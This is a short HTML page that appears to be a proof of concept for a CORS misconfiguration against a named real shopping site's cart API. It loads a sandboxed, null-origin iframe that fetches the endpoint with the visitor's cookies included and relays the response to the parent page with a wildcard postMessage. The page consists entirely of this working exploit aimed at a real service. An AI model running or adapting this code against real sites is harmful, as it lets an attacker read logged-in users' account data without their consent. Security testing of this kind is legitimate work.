<!DOCTYPE html>
<html>
<body>

<button onclick="run()">Run Test</button>

<pre id="result"></pre>

<iframe id="frame" sandbox="allow-scripts" style="display:none"></iframe>

<script>

function run(){

const code = `
<script>

fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
credentials:"include"
})
.then(r=>r.text())
.then(t=>{
parent.postMessage(t,"*")
})
.catch(e=>{
parent.postMessage("ERROR: "+e,"*")
})

<\/script>
`;

document.getElementById("frame").srcdoc = code;

}

window.addEventListener("message",function(e){
document.getElementById("result").textContent = e.data;
});

</script>

</body>
</html>
